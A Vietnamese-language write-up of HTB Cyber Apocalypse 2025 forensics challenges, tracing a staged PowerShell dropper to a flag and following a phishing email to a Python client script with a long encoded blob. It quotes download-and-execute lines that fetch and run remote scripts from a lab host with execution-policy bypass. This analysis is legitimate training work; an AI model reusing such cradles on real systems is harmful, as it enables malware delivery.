---
title: "Cyber Apocalypse CTF 2025: Tales from Eldoria"
date: 2025-03-26 00:00:00 +0700
categories: [CTF, HTB Cyber Apocalypse 2025]
tags: [ctf, htb, forensics, reverse, writeup]
---

## Forensics

### Thorin’s Amulet (VeryEasy)

> Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

Sau khi down file về thì mình nhận được một file .ps1

![image](https://hackmd.io/_uploads/rkvqnEZTkx.png)

Mở file bằng note thì được đoạn script như sau

```powershell
function qt4PO {
($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO

```

Convert từ base64 command

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Đầu tiên nó thực hiện kiểm tra xem biến môi trường COMPUTERNAME có bằng "WORKSTATION-DM-0043" không nếu không thì exit ngược lại thì download http://korp.htb/update

Mình viết code để request tới server xem sao ha

```python
import os
import requests

os.environ['COMPUTERNAME'] = "WORKSTATION-DM-0043"
url = "http://94.237.58.253:55848/update"
try:
    response = requests.get(url)
    print("Payload:", response.text[:])
except Exception as e:
    print("Lỗi:", e)
```

Kết quả nhận được

```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Hàm aqFVaq thực hiện gửi request tới http://korp.htb/a541a với header X-ST4G3R-KEY và sau đó thực thi a541a.ps1. Tiếp tục mình gửi request tới xem nó làm gì

```python
import os
import requests

os.environ['COMPUTERNAME'] = "WORKSTATION-DM-0043"

url = "http://94.237.58.253:55848/a541a"
headers = {"X-ST4G3R-KEY": "5337d322906ff18afedc1edc191d325d"}

try:
    response = requests.get(url, headers=headers)
    print("Payload:", response.text[:])
except Exception as e:
    print("Lỗi:", e)
```

Kết quả nhận được là một đoạn powershell đang thực hiện convert từ hex sang chuỗi

```powershell
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

Decrypt ra thì được flag

> HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}

### A new Hire (VeryEasy)

>The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.

![image](https://hackmd.io/_uploads/ry1e1SZ61e.png)

Mình nhận được một file có tên là email.eml

![image](https://hackmd.io/_uploads/SyW7kHWTJe.png)

Mở ra thì có nội dung như sau, điều cần chú ý là đường dẫn /index.php ha

![image (1)](https://hackmd.io/_uploads/rkAOySb6Jx.png)

Điều hướng đến và nhấn Crl + U để xem source thì có điều khá thú vị tiếp tục follow các queries

![image (2)](https://hackmd.io/_uploads/HJwhJrW6Je.png)

Mình mò được tới đây và tiếp tục đào sâu thêm

Đến khi tới đường dẫn

```
3fe1690d955e8fd2a0b282501570e1f4/configs/client.py
```

Thì nhận được một đoạn script như sau

```powershell
import base64

key = base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")

data = base64.b64decode("c97FeXRj6jeG5P74ANItMBNAPIlhyeTnf9gguC3OwmDQHdacg769YdefatM+YvUK3z+M9JaP8O/qb6vH0KF6rVk2laue3s5+rZOq4fl0kOKrJ3KRxHbjcudrMQf2tBc7iukHq/GD7RcSx1tzjdgLirUFk1RX8lk4wi6JDZ/c6dmnzqwE7wWUfMCf2XG3KpOUVXRpM6dktVYtkhr5pfp20Fl0/GYIAne+X9LB6eXd7Y8A69UH4KOFpNAVR0Hs5k0CqeBroaZKrBi3zQGWwEoT59FquZYO2AT8H8Vz/MHrrlYHAydkBHIVhIcOe6slnb/apV4rgVMfPVoNkoutMj5GlrqCBytVghU0ydAG9vX9F/IuwH5D+Nc9lg9+2jthz8u8qS3/T62Y5a0lBSODzvQJ9IuHvo+oh+8EQV/WciLiD+gp9snIxiUwjXpqi8CxReNwFgPUmwiBZe3pEE388OLSJopkdZpCQ3yGXq85ugUz9YOxltcywotisRfG6qMpWttSTN0BrIit7TjjLP7rB/8mBBwmpdbVD8v53QHhnsIWXDVCcvU6QhOcy5poFfSxWZbbF7DfTzt3G+9zGL8HZrRn0aVzCYQrezLaYg4YQbMJk9JO6vzoAIJNXo9bj4DQpLbuHAzp2hspJB0GKwWOjEwXTMgZQP3QCTivTajT1X9nkhMROWlr6ShNSeN7GcxRCqdJ9DIbIt82BjEl7tujm9a85E9OWDL2hLMfJpanPTg6Dty48UCkErR7+lYeG/bnFfB1qU3kUnBAu8+bY4Q2NGkegUa+sAURlMb8LkmQZkaC7nEytlwSEFKrb8V4/sEO6i5iW9XpCTLQjhRpDAD8SwV2q2rhHXBBeQT9mpicZm86LlGvZ80auT6fFvUUU+EGke+RPZnIll6tHds37bRGqTmrwVZekaEgqDqvVrgCpzdbgRVsO6ir6xBZFuGy8ehtzNGWsPmOrRO8dpKhtpxPsXivfz+bVbIZB9R+27bb17H+zEEfJqo2mr3kNUjY5dZj5UEYEUglZfykR6ST47kRcyRO3FHheDVJvEM/KiDk7sdCO9UgH0DDDV1Cu5O+lZ5MpDq/QaoLJ9UriW1vpKm0RY7F+3sAygXECoc8FKL8HzzBARz7wrOyEG9KYIVBtxFg9RNWBtqsMABHclf86z6tdDsqgaaYdP/9Z7MKHLs6cGQRyI2wzvdMbKeBbJF1K3xlHu/i/Qb/nmcu6I9JRY80cAuZuKT1EBEvofjyYOdM3a5VP7GJ1Hj/L0FH3U1NOhs03vzuV2gG9AYyzSLGhXUt1YGQSYqlKzUimUIQ770RrFeXDQfg6JdNInnRM7pFvZethD6lVgxp1r/lonVGhPSnJ2LpUJNnjbEvDLUwU4w3IFw+ggjE3ca469KlxMwG6bUT1LNOsz2oAaa8HrQ7P64ochXjfWhWos6CSvvwo1y354PTvVmV3bBwNLh35AI69DBid1jd+7r8zSyXIQUqVYAjM72WP72xBCnz10CxVVltCWMHhShA/wrRPYaEtzf0dqxEudFpmbbLqvflqDoB1rQp/CDg7nyqf871DaEzeXgzC1ymxtZWUYHpZFsAVW7LmxAs2gNAart6bBYxd3EeG4eETlO/j3ERO/im3Zn1oyXXGI8Vk20jPsYQkZ7C/xx5JSeUjQHko0OrY7wMBP+MlbNGV0SoEqUGDK8M/+quWHAgDR4dPk4HEwn+toD7kUUgDc6RhYd6IweUsBrpfZ4unJlojZUHCMdMA8nBFD0bC/ZIrvino5EnX5OLvRm6fQTtR/Pu4yXqIg2bvKxstIZKZfkrhvA2jtHerLX0bPjlHnIvIbQT6y3R/wwQoGS6WD9HRcseE1cHzhUqhC9NZyHdV5rTbaQCU27XtQA0+uUp1Jgic1LX/y1m1rd2Y913q9H1WuHFkYT6rwydqN2FMtHLsjJ1JbdkSp3h13u9U5EBxpaLjj42RDQmqK/awLBm2JXaa86yaRGFOJo2PafmIhNtHon8yjwKbhCQWsxfYbQIWpEabo0ZcB7ZcY1lyNG7mR3HrIzpcKywCQr+KgmjT9mNBsjRM1qASNRRrZe7Sv1qG0TxiFCq2iXgCp5pZG6IG2lCwFbZKhLHmoQOo7iRMeoF72Gkf4znBXtYT206AGES7SCXZo9v1przgqHW8cRUbpmzlkKnLlyoICtQcaF7rtHY6GP4WbdauULpyN/iwlB5e9L1odOQMQkZEfpo+Zk31wQTbzBbdT778I9vNhs7R1yX1C4Bl0Qa2jMgU4ewelfc24Fw92C4ujRx8b1D6ANoXnxQZ2mg5cb4mLJRdaqmfU7gFj+w6oCTNJE7LPTHBthIYy0Bn7ny4pm75kVLNKoWErloiD29SLYXo4o+OviuonWAJGjn0JoWZ+axd5c7rBj77Cpk3v7LGJmTG0cX6/kBIous0SaZcqoLtERJRlLKKKiQLx5mKkrej3egQCO3ITNzFqQQOT67kMSvXgUFqsKgodZRhUaO94LDuHvpxZ697UBJp8ZdYjFs186UrT166cohhWBaeJud/IynSkVYrX2OaHubDlf74sR5ZUCNTRiWSviO8eCschj5TTCT0SAJWpH+I9ecZNu1XHqZat3sO6+BTJBLDb5v02lpP/PrPzNbUwLXegEjBoRwSw0d4DgGsuCbFHLXIYdsPo5Klc+C47DxuMyaAigHrIE6no5FYy2ii43RHc7gpPweS6j4+6XZjlMgEvcDrK8j7QKlCeYonoGKxG/kPDcwMB7UtohHR9QyrixEaTzmkRoG58BL0+A9zFNMkytHb7KA1o+36fI+svsYAmtEbwOsXrYykHehmMaorVgmlXE1BA1SiH7GbQyl+fIcC81w4Fot6WHVbGbBg0niIZJTSsLTifmpDz45yLBhQ3n8u4JgrZyoq1k/NM3wdROgwyFjXXzdaga0pgcvbsr+viHMLAUSj0QAhjI73JAxaWB8WPb8iWGGpL+Abk6Q0BHpfIo/kXJXgepG1ti496onHCcoYNLVURr8CZvFOeb/bhyG1mp92vewyJUWBa/O5dQ6VpRfH+y0cxSvoLnEpeljCJ4ccMuu3IYwhMQ0XS26QpjzWyGKbVdaKcvDmGClem8LKliKJMfWmM3r9hJbui6ftrJGnJ2xqaOKtKiPnPKofEMhbe6SlAxrpUEuOcerJ/aHxbuZtFb1DYfQr+G121l9o+M9JYg4K9ef6kHpwpysGKjNPS+QNA21hUs+47nJTuihj9ypkIn0VmFNCZCnkcsT3t/uRGJVTwcaWh3MvZOU5ipXpxVew37J5FyCDZ/HDslBliBDtxNIrwdne1/xsAEvYmsgVRSlRmAuQYqvzfJjceuoPWS6BiUVwpksHjBZveow51K0KTncQFFgxc4Iw6tOyZe3l4PTvC89TEtcPB73k4EAlS4vlnk0za5hACOML0zuDy8At6P4T6hehdyaJKCr1w045w81TnBxoGcs8yhBwDq4RuNbFz9MajhxeLde9i/yZOhy1cihXxoJioBZ9lkPnFUVGk64qiOafzZthjWlqaLsNPjU3QSObHHaL8wgGUch3KQKZUWE1Ugt1kguMZGXjkME3uYYksrmGXAAz/S2rxhn1T7BwuxsyBoCPLX8QsV8lfsTBIUsSfWeohkOZElTdb0L/jQMlX9eqw2sigHdXp3fv6LVxRGJZ5NE1LRlsj+YpLIs1KOSg2/g9RiBBlFkuaac2MQv8JSwxFIgctder5dYzZULbixYEDI/lMaQqtj7d5/0GFpsDgStigzQD2oVXwY7MNdxK36TXVb/P3AIOASEog42LnQOcNbBYqwEE2naHx0p8ZOxTUbvP0b0PH4L4K9uGTlTmt66NHQfBaTERUcb5lWdRkxZNiqiV7kyg93Sikr71Y1i72VGjtt9HzQ1+S6qhQ5TQf+qfrWMuQN+bQKs96yf4EW1vwlUQUPftpxN9TxZ4z7FoJQGiFi1zak7uVjDF/MpUo0mVtk6KZFPRC1CERDMOQSL9IzvDhvJugRk9yQd1hOSpdxKfDomSMrJLC00L0x/hwv5XkCAEdoTD21pRuu0kJUavJOWUzX5+02r2loYYMnhR8NfhDmKUgZZAf4rCRfDCSUWfEzz6gcgQiAMJkrRRddmhnITgcAjChzVpPMUkXJFMqHA7NbFHVo7bZo3nEqhvzkrNaw0GFmmesZEip2wroL5Z5hkigP0YV2qAiYdEYL6PmNLcEVwfTfOPhr2E3m9MGisaM8LfuSk622TGmSt0yF2c69DDtOdZ0ThDyReCifqVT1hqS/gPyVx8l7zXU8MvEIrrkpWoQ/BaHbSx/gi1HuwBAiGv5LzAwfvX4WsysgyQgzYZxM7al3ZN+5mEZBXXCO06gwTKDXS1zFCdqSX0J/RQuvSA60enVDmo06tj75TFOSzg41SrkDq4yPeQ77wM0iI2KnsHXaBm3HwIjuqucDNXZpThFsEB0vUzj5d6BIW9XmnkT9DTFMysdx0J8l/2uvtHQSDmoA0O5av++jrF2dR6Z0PvnU7AsRnV+phgsuFFg29oU+dHi21flUhGbh4K4f9rQ4qT4gRHYP0p0+Lm+ViFNcpc4phxTw2ZrsCDQDjZl8g4+sSCIFDnt7Ee0ozJENyRhdUrEtsop/UMhYE4Q3PQIh1NDW+hSyqIZxuhmmgIBHukRyBiMvTFYq9Tb2ACwPEmAPkcHIVGWI3FH34Fsp1lHLtcootc1WxZc6dhINPLCDeAmYoaymRa2ycOSL7NLhqdQxjvZYILQeUk2G265nhmYS6+mDAVENIWRWkl2keKcq12MT4mMw/GQdLG/sA008TitsSH3+YcA+HZggCK/yQOP41mc6Uih2GO4ITBAIqsP0t5QWFHuAKksO3q3QZ9V7JtAb0G2JUpYPWUnyF2wNvjIc/CrfnjgUEPUhSJgSq0A8jAfFkGBkpcinnpRRKjhCZgqZyRz1nJFHPIOlxp17xGi4d3QCLspVqCeXhO1aUgstfPxmKBrAq28d1rKUZlVS9fEsG9HOGhyyxLArajaPzP4cNjLNCiXkpfkkX/AKE8KAG+O7CmwkfdD/9AZmCYVAXI/fO/3A+PenRWs/SFlh7u8Q/Z08DyROjXJULGDl5pCzyrslC7xZ05gCp0WcvvJFGXlaTrZUZDhIhYytQ1BrjY1JlYeiBxA1/6nVCXffpL4+f8L1JoiDYSXlLVWU3fXPvDwb49YD3G4OzNSfpU5mCNq500RK6DAFeHKxgqUatGXle67SZKAWMnE07DNAqy+sO6Xu8VSkrJ8+doC4UsAW6QgkKhAvWGVyFE5r93d3fzW57sAHLH3A3TQts2xhNDn0fOQm1alzhcRH3RsEjGI/MWWX/3gRBBy8huWx2RJQu9ATUWMGCui/pgBe0aZebLTc5cSwHFxSmVCAatdxSoklHz3Fk5fxDcDuPwVMBl8CSY7BJT2+URVWRGAFVasVtFW8B5ypGwacsUir0wjgBrhBK5G9BJybHD1rne/rC5TjNm2xl0hchy6IgnRKDHEcl79VGNB1C0L7LjdqFHK31N6xToiYskAhcxqG/Bo2hgDOghejpFQTdh+EeDEBhLwpTjYW8BWxUbL9+I8f9M8D3kEoH2xLay/hvHer+I5Kp01JcZ750N/KNukzupahfX8u0Gt3wJZoMfGPAezcpIoH+vEP+EXyIlmX/JsKwZKYd314N8OfOopbDOF+mG/BHL/0Duh1xhyB2ihOdmKniSsxhIp8IBg+7oEwPfK9jhEgiStgkbs2ftakYMoWCLIhcCo5xEkuFR3Trauy8Ntu3NUdwRTeP8RBum+PQt15CB1Ys1dQsIMwvjBnqBfNYb9yBHUmSlI9x6wM3wEbI6TYn8qJKLvfDq93hhXM/xEfp61FWeZIYT4jBhX8xs1BxVTyT+HUp+q4/+/jbymbrwzO/TNls8iFk7eNsXn83zp6V2yojizmUUBYwQcJkkbSBg+t4kCM+BWA1kLJ4eu4tYxuEfq8suBa4BODJEZHpQYRJrmXZLOZ1EMELclDUXjTQxvdaWGsl92yFjW1+p0HpLzl9BQJtOSBndMTDGzh4qLpqYK+R7CyKwxnXfWGinyoCmJCtBd9zUA11fKr5Szt1ZuN5HhSD2/6BkO9YDeVGE3vigOJxjDPxv0yMlF5mIAVLAtrltNvxOboAyHsHykshAhstWl0rK6cIQra486RdBmD9xfljwYa8SEl3wIVTOR22CECSOn/vniJNJDx9GD+9IM50pTY7qlRLPDCn1DhZg1zwAQioia35i4nWj0H6TCXeB9jbxvOCF7rB8f31WagsCICOgOgKEBUhf48x7CHItLkuhBPgBixmO/JulXtskQVkXrEiQGRTB40h1LBuHIJA0e8JgzGINewNe3fKVCWbof0r4CbGUDtorvzytZ6VgbIf8+msRQQZLNfalgn/s8c+6FFzTNmVWeJCNXTkYRFKEHPbqc5Ald32C4lIPPcdGjyZThW8IcT3obQpW15KpDB55owSDBxHVyLyDsJDmDS8cQJFcE8pKAdcel+ZRd/0F7MwDS1/1J33ZwKUAx4S8RFhwcHni5uxg02/AJcubfMOnPe8s72uz87ZsIYIRl6lUtBurHB2Kj6f/QhwHL+KXrxnLowSL81yeP+93mTh+antGKWHxFtL5O+20YkTTDzbjA2e7swDYDLsDyBbvE69XIIxIEedvwnUjDFLBWgjHIQi51pIA0RsbGz8ATzoFQYjE6+fUe09gByka3yrKYONbdx/EvP9ukwgjqyPDYEpNtGaSs4W3CgsE2HyCLbKgSHEM/XiIm2OilHxaXpJFrQMIYUiYEqRg7YJpQrmg3fMOR0ZbEMDVQd/vwCl4ksEs/JktVoKTmAOPTKXC5W6UIfNx3aOvYpJkcR8yCQzGK+EAhrMFUtuddZqMcTRhRsAa8A7IS6w4DHdlHY/uI9O2FYTK8f//JRgndUhDZohStqI3DEKFRrkZipv8DQ/iPkF2CBF1of+ZxI755/uLrZv+BNiQH8FvFAfqYmKl7EO3DWeUigcRUoCvrnRYL39AeFiSlVKCA0A0JN212FBa45JiYX3HgAsog/UJy/4dGzLOL0fQ8KEFE/WLRBRh0gCwNPQHz2h/6Br/C/TJCqaLKepdo4G3aUu2vgRoDNA9KUiZmLQNykjBry4WTl4cZ4LO6eF9s4PmWNL9O7K9zYciZhawt8DLUYoMBy9/sd4BEfx8Pqxtpy8FnbGd7U82UDpordeRsTp6eH2NHmNYhWfSqYssveqY+LrWdR9/dGy+xzY4hYngPYCUGv9X702cLMIzfxe8rvDn8roB453AJy8iFWa5WrF1GSPmQpUnzJ5l8P7yczgbU/CrEubm93qNaeMNSZmQrbvLldzX1k8Laqi2ACCOSs0jUldhEXP8Q7G4u53fNYgVa9iQPZD4Bgdfl43DTYR5avN5BL+1UJzHvFLtPlpXRj9kkm9N2OCNcwuBoCpxUEp0FbHMZMDSKvUTJobgwZeDyl2lJUn8B2TgwgQ16fWTukFPDCuDCjYaWhBUDVm4aYjTWsFd2/Ph48lvXw0+9s7yzE9/La59jMlbJLGoTLfpDoFIHUdXYaTzZ2HaP8vwA24Br97GRLR6lc/+x7VrK32hRGo7/Ah1HYJFxpQS4Mes4nDnMn+khU6l4G/jHG08lpq9tBU4cJoOG72vYsIEUOyRCtIfs5qjqsPo4f0t76FPn8DeXnGPk47hgukRMgd9BP5YKkGoV9RcPjgYNXkKwQ7WZaHBxn1gaGuAFIbcaiCb6kBCeknykoENM5R+SNMkc1vHpEEJGhANpKucEho7AcWGJgvvZMtUpUHd7I6ikwgwscQR/dBr8oRxTw6pZL/GOptkJQR60kl5u+zsRgY386xJvtnY+54Qfzx0rXkyZeLENpRtJAe1stOc+w/67mUB+tXkbNVu+MVSH86WJbT3IgBHhxABVxp7JQGYYNizB7bQt32WUVpjCUaDt4D2411XjoqMGNldFxlvRHHGZz4ZIZLa14Ivt0LSY4qQzbRNtUIb5PpYZht5Ug9NeyK/4HiuHkwyU+4Sclu9GqsV2K7PDDnCMQsFMjhSpPVavZqk0duJzyZZPJrYSoNzfBiotLC8mc/iXMQmDcfQixJHGruh36+UP8UIiHbJSnSCPc/vQ1fU/DA1DOyvVS+j3RWoVYwhU3igDc3LsYdO3eBDbGlj2ChOBSFY+vObCacBIwJxUXWUvGA0nWJRmRIcoSXkwAcMic0VUV2a4joS7ucHHaaT86a3l8R55Cj64cKRfI3yfOSXGEis7GI+1kePbq20qiEjB+ly6w+ZVtG3AXQbQQnCruHabovJ8TgaQzYuoMbYJlJjjY8sf2brkeorxtq9vaC3Zgt9SV8fvQ6A20XJJ7s4wCoO2kZDJsclP/gwqVO6UCDiNnhNwahvzkHoAMXgn4EU5qzy5WHIqvvrmCx9eiVN7FwXHJKXRWMl8eMQiciVFWl24vrTpyParQIqlXNo0gNrjXZhqNaEcVXuvfBsOxVOBf3HA34dp2MABoKhcZWLy3kizcsmn7i1A4ZTi4fKXb4BA1ulZGDgNGpSt5lUYEEolbLWrt/GFD9sdupj57FdQqrFYpL6Hwo62sHp8eOJBLqM4PtHJVkHO3u2KXwolexxQkJJcZcA+VbyGhH49cYkyBtDh6SSR4E1hhqnpEohW0Um6GiysmhHDqKnSQB+zGI09s0Jki+grsv/Qgta07xATNtCC7E4zC35A9+Yy2zozRPOTsd1HW4Xs02TxVGJdJi5C52dZtD+xJfzJJpUwn22alKvRX43BcWgZTDFhlVTord0ykDrfEcl0NhlxtOoj2GqZZJedrBLLx/q94Wt7nsDEMMf+81D1pRcJ0upjNzTXiaHWyd1UUNlm73cSaJQdf8+BMMKjV+TMzp62fGNVysXBiReOOuaZw808eFlsjTuJXU9oMYIqx+Ue3qn71lMBlhZMYso8UadM68GZlOKUgFkmdmv7U7ATikXwJi/dqrDgxEd/HjUez+N1sBJl5qgcOJC8KlJKV69CqNLXZgrBd2csIV1j8ybUfUi8cT5bSGLoV4xEEPt6OToY1uNagDaaiAR0N4KIvRWmXRnZfEEpyYaO/85GtVeysWAwNBXaWgWc9pCu/V6USNCiTBkiL4uCnmOxYyr+DESIxkHshOA1PRBUn35Z0EinVLa+pMYWs7z+7V2PxPElpUJ3RIZcUcOT4Dhwkn6awuKMu8ZeCiOVqzojk3mtBB9NtLZq3ozUJPb2+6nR5WuvVa/xHoaeo6I44wAXD/W7nxWC9nCPi4S3v8IfJmgYS6MI+yhmr3iCvvAkfCMfwzsx9Zh+fjCYSp512oOYgY9B3TrR7pxKMvAOTP9wNG2W6V8H43utqu56QjiHOWIgnVmnUpDH8KFL/YARuv49oKyfIidOIHiVWFPo5odOCdoQBFu1jhDT3NctRRaFvbPWze1vPIVC/1wxLtmXGJBOuDag14lyYkc8SmTd3shq+gGYOWYx1V8NyhrnaAOzQUgHrhDmaWmwB+p6ymSPY2UgQhiVIrgcLGMuJap/7Zlkhmtnxm3rHq9q0oPt+FTu9b+YrNcjKqqbBzJBavCTatcuO2A/Ak9feZk8iuKocKTprO8R5TlNPybuF95iOQwNMd7VpFE0QO4pMgro9/jyqoRv3YUd9BRqmZRIL3uSMSFcha5KJekdg69PLK7gw75FTrkeFHKD9eEJmlHhf2YzzNFAZtNwrlJ/Q7TWyzIMHkiyw2smhaym0no/1tpYlsycVHYudcgMOwUat/5M7y6c0/1lui0lwVLCaApbbOmoivrHhTCJZ0Y+NQXRzk7CzUekbgSO341uJh5ZCTM4IgsyA1GXBPeIqnEnQ/Na0foQQBSTBESlwE1ZMHNQ32E8s05MGkjmChoyKn57mOcklY7hJkzr1lrF4osp1q2oWGz+qTZutNiJ01pIwTDQ3EKwv+HQ7shVwc6dEdBkPC3cf3KFbnevhCJTpq5CMgbAfxffJY/Y/TePmsE41kBgutIEka5LDwrNFa4ivhyzehe1OdMpXuWWCGsLmwVSfqxICu4fGddKUlj1SxvthB437Xd2oOS4huf+ayokopFHl1ILMtB5e9nmmOriKWTYZ2VjBYnObZAwLH9rqApU/PIwAORLd+Zgr5xKrD709vjpdvc8J6cDnFPs7pg9O99jneA7EG83TU+/keFap0lIhQxq2T4WHcAFHDDKc8CkLzUl3pE76lTfMSkiNDZQMF5yIFYpt6BF7r9RMKKuhvjbtOdh1bPPf3zkVRJqf43URahX/dJHPZiYYdiQCjRMbLy/cvfl1CbodJ1L4HgL/AB2wibMArQ89YBMWoymDBJzBiumG5sK11/QRreerEWH5Xj9YMrp1i96+fV2ND3O6HQ4V5tY025hYEWTLdko03bYVwSRMrpwWeYIsv82SD22Bdtq1pA92HuiGyg5UoMI9hgjGE9EKgsnOrf3VAPUiuQ7MZBv3VC8JbeNWMjgaMMEK7CKyQCYuQWIWr8q//SbIKbDbxxtafzf+ai0GJHigjdtkq3zmm282JXRkZfQkqZ1vLC+O8AbQX/IekXVchJRC5hAIgpydfXXGW1DuB8ZF5AW2uINzzXcm5MN6R4UtfZsly3HjfW4XLKRsItReXJwPuv5w7rToOufIw1Yk6SlMb5B3HhzImmVgk13wLBcnI6VwLBeBav30Gda56PA5DrBw1tOYIvyqhZWFJWhNKv8Ktxg6ZIjEcN/PTnrlyq8qh24Bvr3Kf/BQYXzzPdhMTBD2jHZfJXQdBig4rYv3aG4oKHuhMYk6d4EUnwShY13C/n9bNwKQM/0yLPRiO7l4298kIWWWr/k5mj48lj4gD+sGG3FhlQlrBYuxmCZcWxFnWODiQSDI8RysXMO1Y/+psCA5bYHN/vLj2NMgypmC6aNqi5DI/CP21foiNfxaS0gdoZepFMt9WFlwKKyKlsrVW6nsGD5GxyC989kjCSqteUQLqz7/ryTduiqT9k5HprugnY9ACSFg21pTuUyOt29NL4XfSwYLDrMnHBjkSoj3wV3574qm4kCrAJA445JgMCFik2GYQVCgHpcE1T+XChCvHT9Ha4ToaABGN1rjZ1aJRo621KI/NwbKRu+UBDN4tXVzp5sS3LIMh1XvhnRRSdGlQSZGr+5t7hGnkg+rjJV4c+3PwyJFIyLuQrBOUHxtNokj+x1w5KqvMxT44to8Mfkk4kR8ujTkQGyyEGQHJRpDIM687dx0eoFSUf9oI9JtDcq3I6VwsBC3y26QDS8z51HOySq1+pQxP3u0lRc6GB7jtAhwfX7U9jjsANMcemmc0gVr/wQjb8fPtJlUR5ug8yBYeP1tFrPq35FK5YyHmc72Zxq2gXWXoEKGKRxKocSyfjq64hAXBjLBgR2cpFY1e8MxoDBc+6FlzK2TiKV32ILdEjficzSHu0STX6GNYnDgOXDKIJfx4+8Q7TpnQC9s6BkLHoUsWA2YGfHpM5A8OFkYw46xgOmzIM9290TTuohZgybRpMy+lG7Hbma337PjhCmSyWBExCai0IjeB6B9p/1+droJ2Rfgb0E6nJgb+lUSjRQeH1y7OFR95FJPl7bLwOBUweL4NyXJ2UpHVFeKCzFrgU9kvFDNwZSUdkj5O2Txrjj+CR2FkzT4alvqHvN7pmCu8Azg2h8WCwV3CC51j0iR0RAKpDZxhv+wXyak5kHsR37U5ysGAQTVOarX0RXBZwb2hrGvQke+tPR9CmbQ8QHIXN0XQgC/wOJq/dUUOUCkMUOEhFirQKY97ntdApa9FJFgMI0ZxIk4fTpD6u2JWNSwgc7YKMKOl5x6YRxUfSBEfWqYkmWd7EgEF9unxfhUwGP2cB4ZIJYeBBYfHwClnSmsYXhr16OknoxdnIHTdNT/xx6D0MHJ1LsgHupqdvCcRiFHWhJSAsk7P1ajYfceYSqDO8W3CxYrVKcLRqCh/gPrggcDJ0IJlQ5+UaIhw5/giLrXgjj/j2lxfY1FYTPIddaeu23VjW+Ey6jhKUKdWj9Hwppo6F8egozsr0AOQnHT44dNYvn/4C2DQ8FUQSR2tHYpr1BpQ0P96rkCUNruDqKG6ArMpSoEV0tc+Qv3S4F4HwNtNiPSwIAXFTK1xZXwPnc0XcYI8DeRfAuAkazedVTFJ33/DOFpIueDmCOy/7EyZzURQDL4n6trPIJ0lKhRghm20JwFm2aB1klxtZNONx8OTOG16cD10lc+IDiehNDAv/r/raqTHmo7D90UzUGfazhN2xaNcnl9gQzkCAJzpJUqbic8XRorcxm2G8aWhs53xF31EEuhltAQ/JH+wzCYOYmrqKSsMAzZj+A2jGOfHvK4CMIULUCaJQ9zXagLcxkNDmdd2LU6pFHKbi3t11oiZCO2u40UIS2PCW/hq0OQKSJeQ0N8mazldkVzLgcsboqvtnGFhEMa/IMQKBX+gOVZ/gKiaBdvTc8QZJCREjc5PP9s/kkP7zLqz44OfF/S1MKWDWAt6UiDhYDbi40mxwrLBq2JUMadSOEQPBxg1OJVl6ZfTbP4htHtS9HSx3wT8D8KBKZbYXQo/YDflanRbSeNCMbiHC5NRWGppKC9FQX+kde7m70HEbPrngJLwetVunPnfHcF5jQyNd3bPvJzIQ23zIS/VlbOHMBzfInvepEXPpS0ix0S3kfcJ+FeEkWKHn7T2/LQUSNeBu9/4E9ft63JASiP38IdVbopmp5lwWg7abITO1N6b5XvKxnIzCTnM26gzs/3juJ2wUYM4QDS4uM7IGIrQdq1PhcSYzFA+RHw1TQcuFsr4+dOeVKThDBgTPOy0Ei/K39n+v5W+r/ha1pJEAZFxJu8ULfnFoXpWL5vol0Ab7jfzWYWu94Vfd/RdaLIjtg61cpQk2oex1eypofd57CsYWMw6KEPdIZ4iwgO30ilDi833N5PGcKaj0efpewZcaz62QCTnjHgZcPevG0WMMPB4CjkGu28RZfTsD2dc1L8AIFKtped2DpYwSQ9W9PIXEbsjILp2T9IW+iKgZ82+1R+eGBv9K6xHjBMM8okzWGhKfWp1nuZ2vrkPSTRtIIsmmAQ2tkCsE4JfIKx2gOZNg29zGxETxRNPkwZZ0JN3VUiyUDwQhj4zk/QDpLqLoqWIbAVE+bH1tYB31kpA+bUYqWzf22egSIKzozOIphFEK8/pVavU6ezi/vor+27g9DE3nHsjAWXXRZfUERS+oN2M0iroYpjl8/o1LQCqPVpLFtB9a21Em6vqtnTxvSkyjsGIK0uzP6mryexbUbdtysn8OjmLGS2e07yxrV1+5qA8JV3BsnlDNFXcrjgEClHcUTqV8M2W95PImZ3wbVJ1k7+dV5f+t6xwc1Ee13HxnqNcGIfiSEKOvBpGBtpUMXAObhfr1B7AQZ7QkibCpPLttWRqewbLrc7D5wfUI/UWiXO/jKQh6tNwITy+GvHwMTReOxTKcw7rkFikOr7TAVjjorDsfJ70rIPuM3qP7KGUCjf67tabEqAlEytXZWsq0qOrd7cGVRlIVBWagHJdvJZZ9HKDJxBFm68RewPO+2WFXYrfiNYkxYklLw0Eu38tnrLM9XhQ9Lc10v1kLIJjUkgkAL4J20xLzmdHVEQGyR7QLW6EENe9SwfVwWbxu/52ezFSbEJ71ue5YX3xdXoNfz+FbYmV0ZxVGHXBLCwgA0J4ExQuGfUHwbvfPv6GeBWF+Q5ECE3KjDGOuWxQem2sKeUCNnkNbvWZT4gXakd+QQYT9ZLGQLg2Olbi27Q04HnMv0badr1KCJz/OwSA3eDVuvCIrNBWQ